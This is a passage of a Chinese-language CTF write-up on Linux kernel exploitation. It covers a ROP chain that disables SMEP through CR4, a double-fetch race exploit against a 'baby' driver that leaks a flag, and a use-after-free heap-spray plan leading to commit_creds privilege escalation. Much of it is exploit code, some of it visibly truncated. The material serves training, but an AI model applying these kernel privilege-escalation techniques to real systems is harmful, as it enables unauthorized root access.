        ioctl(fd, 0x6002, buf);
        // write(1, buf, 0x200);
        base_addr = buf[9] - 0x29b078;
        canary = buf[13];
        printf("base:0x%llx, canary:0x%llx\n", base_addr,canary);
        prepare_kernel_cred = calc(0xffffffff810b9d80);
        commit_creds = calc(0xffffffff810b99d0);
        int i = 18;
        buf[i++] = calc(0xffffffff815033ec);  // pop rdi; ret;
        buf[i++] = 0x6f0;
        buf[i++] = calc(0xffffffff81020300);  // mov cr4,rdi; pop rbp; ret;
        buf[i++] = 0;
        buf[i++] = &templine; 
        ioctl(fd, 0x6001, buf);
        //getchar();
        //getchar();
    }
## level3
先看`startvm.sh`
开了两个核，这时就要注意会不会是`double fetch`漏洞，因为一般的题都只会用到一个核。
这里要注意一点，就是最好 **关掉kvm加速（`-enable-kvm`）**，因为调试的时候如果开启了`kvm`，驱动的基址就和之前我们通过`lsmod`查到的不一样，导致断点断不下来等玄学现象，并且这个操作也不会影响漏洞的利用。
看下驱动程序：
    __int64 __fastcall baby_ioctl(__int64 a1, __int64 choice)
    {
      FLAG *s1; // rdx
      __int64 v3; // rcx
      __int64 result; // rax
      unsigned __int64 v5; // kr10_8
      int i; // [rsp-5Ch] [rbp-5Ch]
      FLAG *s; // [rsp-58h] [rbp-58h]
      _fentry__(a1, choice);
      s = s1;
      if ( choice == 0x6666 )
      {
        printk("Your flag is at %px! But I don't think you know it's content\n", flag, s1, v3);
        result = 0LL;
      }
      else if ( choice == 0x1337
             && !_chk_range_not_ok(s1, 16LL, *(__readgsqword(&current_task) + 0x1358))
             && !_chk_range_not_ok(s->flag, s->len, *(__readgsqword(&current_task) + 0x1358))
             && s->len == strlen(flag) )            // a4
      {
        for ( i = 0; ; ++i )
        {
          v5 = strlen(flag) + 1;
          if ( i >= v5 - 1 )
            break;
          if ( s->flag[i] != flag[i] )
            return 22LL;
        }
        printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag, flag, ~v5);
        result = 0LL;
      }
      else
      {
        result = 14LL;
      }
      return result;
    }
`_chk_range_not_ok`函数，检查了一、二参数的和是不是小于第三个，且无符号整数和不能产生进位（也就是溢出），这里的`__CFADD__`运算就是`Generate
carry flag for (x+y)`，使加法运算产生`CF`标志：
    bool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)
    {
      bool v3; // cf
      unsigned __int64 v4; // rdi
      bool result; // al
      v3 = __CFADD__(a2, a1);
      v4 = a2 + a1;
      if ( v3 )
        result = 1;
      else
        result = a3 flag, s->len, *(__readgsqword(&current_task) + 0x1358))
             && s->len == strlen(flag) )            // a4
但是只要我们通过了这段验证，后面的逐字节校验就没有再检查是否为内核地址
    for ( i = 0; ; ++i )
        {
          v5 = strlen(flag) + 1;
          if ( i >= v5 - 1 )
            break;
          if ( s->flag[i] != flag[i] )
            return 22LL;
        }
所以我们可以通过创建两个线程，其中主线程的flag参数传入一个用户空间的地址，但是要满足`s->len ==
strlen(flag)`的判断条件，这个长度我们可以用返回值是否为22来爆破。
此时主线程就会在逐字节校验过程中失败并返回，而我们如果能在这两段验证逻辑之间修改flag的值为目标flag的内核地址，就可以完成所有验证实现flag的打印。
需要注意的是，我们子线程，即修改地址的线程要在主线程进入之前就开始运行，这样才有可能在窗口期修改变量。
以下为完整`exp`，可能需要多试几次才能成功：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810b9d80; // TODO:change it
    void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810b99d0; // TODO:change it
    int main_thread_out = 0;
    struct msg {
        char *buf;
        int len;
    }m;
    void change_addr(unsigned long long addr) {
        while (main_thread_out == 0) {
            m.buf = addr;
            puts("waiting...");
        }
        puts("out...");
    }
    int main() {
      void *buf[0x1000];
      int fd = open("/dev/baby", 0);
        if (fd  /tmp/aaa.txt");
        int tmp_fd = open("/tmp/aaa.txt", 0);
        lseek(tmp_fd, -0x100, SEEK_END);
        read(tmp_fd, buf, 0x100);
        char *flag_addr = strstr(buf,"Your flag is at ");
        if (flag_addr == 0){
            printf("[-]Not found addr");
            exit(-1);
        }
        close(tmp_fd);
        flag_addr += strlen("Your flag is at ");
        unsigned long long addr = strtoull(flag_addr, flag_addr+16, 16);
        printf("flag_addr:%p\n",addr);
        // int ret = ioctl(fd, 0x1337, &m);
        // printf("ret:%d\n", ret);
        pthread_t t;
        pthread_create(&t, 0, change_addr, addr);
        // sleep(1);
        puts("main_thread in...");
        for(int i=0; i /tmp/bbb.txt");
        tmp_fd = open("/tmp/bbb.txt", 0);
        if (tmp_fd idx;
          if ( idx idx;
          if ( v10 arg1, chunk, 0x48LL);// call rax
          }
          break;
        case 0x6007:                                // add
          i = 0LL;
          while ( 1 )
          {
            v7 = i;
            if ( !pool[i] )
              break;
            if ( ++i == 0x20 )
              goto LABEL_4;
          }
          chunk_1 = kmem_cache_alloc_trace(kmalloc_caches[1], 0x6000C0LL, 72LL);
          call_arg = buf->data;
          pool[v7] = chunk_1;
          chunk_1->call_func = &copy_to_user;       // call func
          chunk_1->arg1 = call_arg;                 // call args
          break;
      }
    LABEL_4:
      kfree(buf);
      return 0LL;
    }
保护全开
程序的逻辑基本上是，我们有一个chunk池，可以进行创建、销毁、调用的功能，调用的默认函数是`copy_to_user`，参数是我们创建堆块的时候传入的，我们可以用这个`copy_to_user`来泄露内核地址，方法就和level2是一样的。
但是可以看到，程序在销毁堆块的时候并没有将指针置空，这样就有一个`UAF`漏洞；并且这个调用的过程的函数地址是从堆块中取的，所以如果我们能通过堆喷将设计好的数据填入这个`free`掉的堆块，就可以实现任意地址的调用。
这里是使用`socket`连接中的`sendmsg`进行堆喷，chunk的大小可以通过`msg`结构体中的`msg_controllen`来进行调整（最小为44字节），这里可以参考：
因此利用的思路就是，两次UAF，两次堆喷
  * 第一次通过`gadgets`修改`CR4`，关闭`smap`和`smep`保护
  * 第二次直接调用提权函数（`commit_creds(prepare_kernel_cred(0))`）
下面是完整`exp`：
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810b9d80; // TODO:change it
    void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810b99d0; // TODO:change it
    unsigned long long user_cs, user_ss, user_rflags, user_sp;
    unsigned long long base_addr, canary;